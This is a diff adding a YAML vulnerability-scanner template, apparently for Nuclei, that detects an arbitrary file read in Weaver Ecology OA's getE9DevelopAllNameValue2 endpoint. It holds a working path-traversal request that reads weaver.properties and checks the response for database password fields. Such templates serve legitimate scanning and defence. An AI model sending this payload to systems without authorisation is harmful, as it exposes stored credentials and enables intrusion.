@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-ecology-oa-portaltsogin-file-read
+info:
+  name: Weaver OA getE9DevelopAllNameValue2 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in Weaver OA via the getE9DevelopAllNameValue2 endpoint.
+  tags: file-read,high-risk
+http:
+  - raw:
+      - |
+        GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+      - type: word
+        words:
+          - "ecology.password"
+          - "ecology.charset"
+          - "ecology.maxidletime"
+        part: body
